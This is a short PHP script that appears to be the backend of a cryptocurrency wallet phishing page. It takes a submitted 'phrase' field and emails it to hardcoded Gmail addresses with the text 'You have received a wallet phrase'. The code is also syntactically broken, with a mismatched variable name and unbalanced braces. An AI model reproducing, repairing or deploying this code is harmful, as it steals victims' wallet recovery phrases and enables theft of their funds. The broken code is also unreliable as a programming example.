<?php

if (isset($_POST['import'])) {
$subject= $_POST['phrase'];

$mailto="dgonyedikachi@gmail.com";
$headers="From: godwindon080@gmail.com"."\r\n". "cc:godwinprosperchiegosike@gmail.com";
$txt="You have received a wallet phrase";

if(mail($to,$subject,$txt,$headers)) {
$text=$_POST['text'];
	
else{
	echo "failed";}
?>